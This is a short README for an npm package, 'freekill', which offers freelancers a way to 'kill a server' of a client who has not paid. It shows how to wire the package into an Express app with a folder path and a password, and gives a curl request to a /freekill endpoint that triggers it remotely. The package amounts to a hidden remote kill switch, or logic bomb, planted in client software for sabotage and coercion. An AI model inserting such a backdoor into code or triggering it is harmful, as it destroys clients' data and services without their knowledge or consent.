# freekill
FreeKill is a project that can be easily installed that allows freelancers to kill a server if a client is not paying.

## Install

```
npm i freekill
```
## How to use
In your server add
``` javascript
const freekill = require('freekill');
```
``` javascript

const express = require("express");
const app = express();
const http = require("http").Server(app);
const freekill = require('freekill');
...
freekill("/project", "password", app);
...

http.listen(8080, ()=>{
  console.log('Server is running');
});
```
The syntax for freekill is simple
``` javascript
freekill(path_to_folder, password, express_app);
```
## How to activate
```
curl SERVER_URL.com/freekill?pwd=YOUR_PASSWORD
```